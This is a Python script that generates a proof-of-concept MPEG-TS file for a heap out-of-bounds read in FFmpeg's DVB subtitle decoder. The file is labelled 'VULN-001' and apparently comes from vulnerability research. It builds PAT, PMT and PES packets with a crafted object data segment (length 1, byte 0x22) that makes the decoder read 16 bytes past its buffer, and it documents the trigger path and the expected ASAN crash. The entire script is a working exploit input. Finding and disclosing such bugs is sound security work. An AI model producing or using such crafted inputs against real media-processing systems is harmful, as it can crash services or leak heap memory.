#!/usr/bin/env python3
"""
PoC generator for VULN-001:
Heap OOB Read in dvbsub_parse_pixel_data_block (dvbsubdec.c lines 971-974)

Crafts a minimal MPEG-TS file with a DVB subtitle Object Data Segment that
sets top_field_data_block_length=1 with the single byte being 0x22.
When FFmpeg processes this, the decoder enters case 0x22 and reads
16 bytes past the end of the heap-allocated packet buffer (OOB read).

Trigger path:
  ffmpeg -i crafted.ts -f null - ->
  dvbsub_decode() -> dvbsub_parse_object_segment() ->
  dvbsub_parse_pixel_data_block() -> OOB read at lines 971-974
"""

import struct
import os
import sys


def crc32_mpeg2(data):
    """MPEG-2 CRC32 using polynomial 0x04C11DB7 (bit-by-bit)."""
    crc = 0xFFFFFFFF
    for byte in data:
        for _ in range(8):
            if (crc ^ (byte << 24)) & 0x80000000:
                crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
            byte = (byte << 1) & 0xFF
    return crc


def make_ts_packet(pid, payload_unit_start, continuity_counter, payload):
    """Create a 188-byte MPEG-TS packet (payload-only, no adaptation field)."""
    assert len(payload) <= 184, f"Payload too long: {len(payload)}"
    header = bytes([
        0x47,  # sync byte
        (0x40 if payload_unit_start else 0x00) | ((pid >> 8) & 0x1F),
        pid & 0xFF,
        0x10 | (continuity_counter & 0x0F),  # adaptation_field_control=01 (payload only)
    ])
    # Pad payload to 184 bytes with stuffing (0xFF)
    padded = payload + b'\xFF' * (184 - len(payload))
    packet = header + padded
    assert len(packet) == 188
    return packet


def make_pat():
    """Build PAT: program 1 -> PMT at PID 0x1000."""
    TS_ID = 0x0001
    PROGRAM_NUM = 0x0001
    PMT_PID = 0x1000

    # Section entries: program_number (2) + PMT_PID with reserved bits (2)
    section_content = bytes([
        (TS_ID >> 8) & 0xFF, TS_ID & 0xFF,     # transport_stream_id
        0xC1,                                    # reserved(2)=11, version(5)=0, current=1
        0x00,                                    # section_number
        0x00,                                    # last_section_number
        (PROGRAM_NUM >> 8) & 0xFF, PROGRAM_NUM & 0xFF,
        0xE0 | ((PMT_PID >> 8) & 0x1F), PMT_PID & 0xFF,
    ])

    section_length = len(section_content) + 4   # includes 4-byte CRC32
    table_header = bytes([
        0x00,                                    # table_id = PAT (0x00)
        0xB0 | ((section_length >> 8) & 0x0F),  # section_syntax_indicator=1, '0', reserved='11', length_hi
        section_length & 0xFF,
    ])

    crc_input = table_header + section_content
    crc = crc32_mpeg2(crc_input)
    section = crc_input + struct.pack('>I', crc)

    # TS payload: pointer_field(1) + section
    payload = bytes([0x00]) + section
    return make_ts_packet(pid=0x0000, payload_unit_start=True, continuity_counter=0, payload=payload)


def make_pmt():
    """Build PMT: DVB subtitle stream on PID 0x0200 with SUBTITLING_DESCRIPTOR (0x59)."""
    PROGRAM_NUM = 0x0001
    PCR_PID = 0x01FF   # dummy PCR PID (no actual PCR stream)
    SUB_PID = 0x0200
    PAGE_ID = 0x0001

    # DVB subtitle descriptor (tag=0x59), length=8
    # layout: ISO_639_language_code(3) + subtitling_type(1) +
    #         composition_page_id(2) + ancillary_page_id(2)
    # FFmpeg extradata from this: [comp_page_id(2), anc_page_id(2), subtype(1)]
    dvb_sub_desc = bytes([
        0x59,           # descriptor_tag = SUBTITLING_DESCRIPTOR
        0x08,           # descriptor_length
        0x65, 0x6E, 0x67,  # language = 'eng'
        0x10,           # subtitling_type = 0x10 (standard DVB subtitles)
        0x00, 0x01,     # composition_page_id = 1
        0x00, 0x01,     # ancillary_page_id = 1
    ])

    # Elementary stream info block
    stream_info = bytes([
        0x06,           # stream_type = private data (used for DVB subtitles)
        0xE0 | ((SUB_PID >> 8) & 0x1F), SUB_PID & 0xFF,  # elementary_PID
        0xF0 | ((len(dvb_sub_desc) >> 8) & 0x0F), len(dvb_sub_desc) & 0xFF,  # ES_info_length
    ]) + dvb_sub_desc

    section_content = bytes([
        (PROGRAM_NUM >> 8) & 0xFF, PROGRAM_NUM & 0xFF,
        0xC1,           # reserved(2) + version(5=0) + current(1)
        0x00,           # section_number
        0x00,           # last_section_number
        0xE0 | ((PCR_PID >> 8) & 0x1F), PCR_PID & 0xFF,  # PCR_PID
        0xF0, 0x00,     # reserved(4) + program_info_length(12=0)
    ]) + stream_info

    section_length = len(section_content) + 4   # +4 for CRC32
    table_header = bytes([
        0x02,                                    # table_id = PMT (0x02)
        0xB0 | ((section_length >> 8) & 0x0F),
        section_length & 0xFF,
    ])

    crc_input = table_header + section_content
    crc = crc32_mpeg2(crc_input)
    section = crc_input + struct.pack('>I', crc)

    payload = bytes([0x00]) + section
    return make_ts_packet(pid=0x1000, payload_unit_start=True, continuity_counter=0, payload=payload)


def make_subtitle_pes():
    """Build PES packet with malicious DVB subtitle segments.

    The PES payload starts directly with 0x0F (segment sync byte) — intentionally
    omitting the 0x20 0x00 data_identifier prefix — so that dvbsubdec.c's check
    at line 1478 (*buf == 0x0f) passes and segment parsing proceeds.

    Segments:
      1. Page Composition Segment (0x10): sets up page context with region 1
      2. Region Composition Segment (0x11): creates region 1 (320x240, depth=4)
                                            and object 1 at position (0,0)
      3. Object Data Segment (0x13): object 1, top_field_len=1, data=[0x22]
                                     -> triggers OOB read of 16 bytes in case 0x22
      4. End of Display Set Segment (0xFF)
    """
    PAGE_ID = 0x0001

    # ── Page Composition Segment (type=0x10) ──────────────────────────────────
    # page_time_out(1) + version+state+reserved(1) + region_entry(6)
    page_data = bytes([
        0x1E,       # page_time_out = 30 seconds
        # version(4bits)=1, page_state(2bits)=0(normal), reserved(2bits)=00
        0x10,
        # One region entry: region_id(1) + reserved(1) + h_addr(2) + v_addr(2)
        0x01,       # region_id = 1
        0x00,       # reserved
        0x00, 0x00, # horizontal_address = 0
        0x00, 0x00, # vertical_address = 0
    ])
    # 8 bytes total; segment_length = 8
    page_seg = bytes([
        0x0F,                               # sync_byte
        0x10,                               # segment_type = Page Composition
        (PAGE_ID >> 8) & 0xFF, PAGE_ID & 0xFF,
        (len(page_data) >> 8) & 0xFF, len(page_data) & 0xFF,
    ]) + page_data

    # ── Region Composition Segment (type=0x11) ────────────────────────────────
    # region_id(1) + version+fill+reserved(1) + width(2) + height(2)
    # + depth_byte(1) + clut_id(1) + pixel_codes(2) + object_entry(6)
    # = 16 bytes total
    region_data = bytes([
        0x01,       # region_id = 1
        # version(4bits)=1, fill_flag(1bit)=0, reserved(3bits)=000
        0x10,
        0x01, 0x40, # region_width = 320
        0x00, 0xF0, # region_height = 240
        # depth_byte: region_level_of_compatibility(3) + region_depth_field(3) + reserved(2)
        # region->depth = 1 << ((byte >> 2) & 7); for depth=4: (byte>>2)&7=2 -> byte=0x08 works
        # Using 0x48: (0x48>>2)&7 = (18)&7 = 2 -> depth = 1<<2 = 4
        0x48,
        0x00,       # region_clut_id = 0
        # For depth=4: skip 1 byte (8-bit pixel code) then read 4-bit pixel code high nibble
        0x00,       # 8-bit pixel code (skipped for depth=4)
        0x00,       # 4-bit+2-bit pixel codes + reserved
        # Object entry:
        0x00, 0x01, # object_id = 1
        # object_type(2bits)=0, object_provider_flag(2bits)=0, x_pos_hi(4bits)=0
        0x00,
        0x00,       # x_pos_lo = 0 -> x_pos = 0 (< width=320 ✓)
        # reserved(4bits), y_pos_hi(4bits)=0
        0x00,
        0x00,       # y_pos_lo = 0 -> y_pos = 0 (< height=240 ✓)
    ])
    # 16 bytes; segment_length = 16
    region_seg = bytes([
        0x0F,
        0x11,       # segment_type = Region Composition
        (PAGE_ID >> 8) & 0xFF, PAGE_ID & 0xFF,
        (len(region_data) >> 8) & 0xFF, len(region_data) & 0xFF,
    ]) + region_data

    # ── Object Data Segment (type=0x13) — THE TRIGGER ────────────────────────
    # object_id(2) + version+coding+non_mod+reserved(1)
    # + top_field_len(2) + bottom_field_len(2) + pixel_data(1)
    # = 8 bytes total
    #
    # top_field_data_block_length = 1, single byte = 0x22
    #
    # In dvbsub_parse_pixel_data_block():
    #   buf     = &0x22
    #   buf_end = &0x22 + 1
    #   Loop: buf < buf_end -> true
    #   Check at line 917: x_pos(0) < width(320) && y_pos(0) < height(240) -> no return
    #   switch (*buf++): consumes 0x22, buf is now == buf_end
    #   case 0x22 (line 971): for i=0..15: map4to8[i] = *buf++
    #     -> reads 16 bytes PAST buf_end == OOB READ!
    object_data = bytes([
        0x00, 0x01, # object_id = 1  (must match object created in region segment)
        # object_version_number(4bits)=0, object_coding_method(2bits)=0(pixels),
        # non_modifying_colour_flag(1bit)=0, reserved(1bit)=0
        0x00,
        0x00, 0x01, # top_field_data_block_length = 1   <-- KEY: only 1 byte follows
        0x00, 0x00, # bottom_field_data_block_length = 0
        0x22,       # THE TRIGGER: case 0x22 reads 16 bytes OOB
    ])
    # 8 bytes; segment_length = 8
    object_seg = bytes([
        0x0F,
        0x13,       # segment_type = Object Data
        (PAGE_ID >> 8) & 0xFF, PAGE_ID & 0xFF,
        (len(object_data) >> 8) & 0xFF, len(object_data) & 0xFF,
    ]) + object_data

    # ── End of Display Set Segment (type=0xFF) ────────────────────────────────
    end_seg = bytes([
        0x0F,
        0xFF,       # segment_type = End of Display Set
        (PAGE_ID >> 8) & 0xFF, PAGE_ID & 0xFF,
        0x00, 0x00, # segment_length = 0
    ])

    # PES subtitle payload: segments only (no 0x20 0x00 data_identifier prefix).
    # dvbsubdec.c line 1478 checks *buf == 0x0f; omitting the prefix ensures
    # parsing begins immediately at the first segment.
    subtitle_data = page_seg + region_seg + object_seg + end_seg

    # PES optional header with PTS=0
    pts = 0
    pts_bytes = bytes([
        0x21 | ((pts >> 29) & 0x0E),       # '0010' marker + PTS[32:30] + marker_bit
        (pts >> 22) & 0xFF,                 # PTS[29:22]
        ((pts >> 14) & 0xFE) | 0x01,       # PTS[21:15] + marker_bit
        (pts >> 7) & 0xFF,                  # PTS[14:7]
        ((pts << 1) & 0xFE) | 0x01,        # PTS[6:0] + marker_bit
    ])
    pes_optional_header = bytes([
        0x80,   # flags1: marker bits
        0x80,   # flags2: PTS_DTS_flags = 10 (PTS present, DTS absent)
        0x05,   # PES_header_data_length = 5
    ]) + pts_bytes  # 8 bytes total

    # PES_packet_length = optional_header(8) + payload
    pes_packet_length = len(pes_optional_header) + len(subtitle_data)

    pes = bytes([
        0x00, 0x00, 0x01,   # PES start code prefix
        0xBD,               # stream_id = private_stream_1
        (pes_packet_length >> 8) & 0xFF, pes_packet_length & 0xFF,
    ]) + pes_optional_header + subtitle_data

    return make_ts_packet(pid=0x0200, payload_unit_start=True, continuity_counter=0, payload=pes)


def make_null_ts_packets(count=10):
    """Return null TS packets (PID 0x1FFF) to pad the file.
    These ensure avformat_find_stream_info() doesn't consume the only subtitle PES.
    Repeating the PAT/PMT/PES multiple times also helps.
    """
    null_payload = b'\xFF' * 184
    packets = []
    for i in range(count):
        header = bytes([
            0x47,
            0x1F,  # PID high = 0x1F
            0xFF,  # PID low = 0xFF → PID = 0x1FFF (null packet)
            0x10 | (i & 0x0F),
        ])
        packets.append(header + null_payload)
    return packets


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_file = os.path.join(out_dir, 'vuln_001_input.ts')

    sub_pes = make_subtitle_pes()

    # Repeat PAT+PMT+PES several times so that avformat_find_stream_info()
    # probing consumes some packets while actual decoding gets others.
    # Also intersperse null packets to pad the file length.
    packets = []
    packets.append(make_pat())
    packets.append(make_pmt())
    packets.extend(make_null_ts_packets(5))
    # Repeat the subtitle PES 6 times with increasing continuity counters
    for cc in range(6):
        # Build a fresh PES packet with the correct continuity counter
        pes_payload = sub_pes[4:]  # strip original header
        header = bytes([
            0x47,
            0x40 | ((0x0200 >> 8) & 0x1F),
            0x0200 & 0xFF,
            0x10 | (cc & 0x0F),
        ])
        packets.append(header + pes_payload)
    packets.extend(make_null_ts_packets(5))

    with open(out_file, 'wb') as f:
        for pkt in packets:
            assert len(pkt) == 188, f"TS packet length error: {len(pkt)}"
            f.write(pkt)

    total_bytes = len(packets) * 188
    print(f"[+] Created {out_file}")
    print(f"    {len(packets)} TS packets ({total_bytes} bytes)")
    print(f"    PAT  -> PID 0x0000")
    print(f"    PMT  -> PID 0x1000 (program 1)")
    print(f"    PES  -> PID 0x0200 x6 copies (DVB subtitle, stream_type=0x06, descriptor=0x59)")
    print(f"    Trigger: Object Data Segment top_field_len=1, data=[0x22]")
    print(f"    Expected: ASAN heap-buffer-overflow (16-byte OOB read past allocation)")


if __name__ == '__main__':
    main()
